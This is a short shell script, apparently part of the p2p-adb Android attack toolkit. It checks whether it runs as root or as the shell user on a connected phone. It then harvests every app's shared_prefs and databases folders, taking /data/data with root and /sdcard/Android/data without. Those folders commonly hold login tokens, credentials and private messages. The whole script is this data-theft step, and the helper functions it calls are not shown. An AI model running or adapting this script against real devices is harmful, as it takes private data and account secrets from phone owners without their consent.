# p2p-adb
# https://github.com/kosborn/p2p-adb/
# @theKos
# kyle@kyleosborn.com



isRoot > /dev/null
ISROOT=$?

if [ $ISROOT -eq 2  ]; then 
	DATAPATH="/sdcard/Android/data/*/{shared_prefs,databases}/"
	echo 'We are user shell!'
	echo 'Whoever, we can grab contents for /sdcard/Android/data'
	getData "$DATAPATH"
elif [ $ISROOT -eq 0 ]; then
	DATAPATH="/data/data/*/{shared_prefs,databases}/"
	echo 'We are root...'
	getData "$DATAPATH"
else
	echo $ISROOT
fi

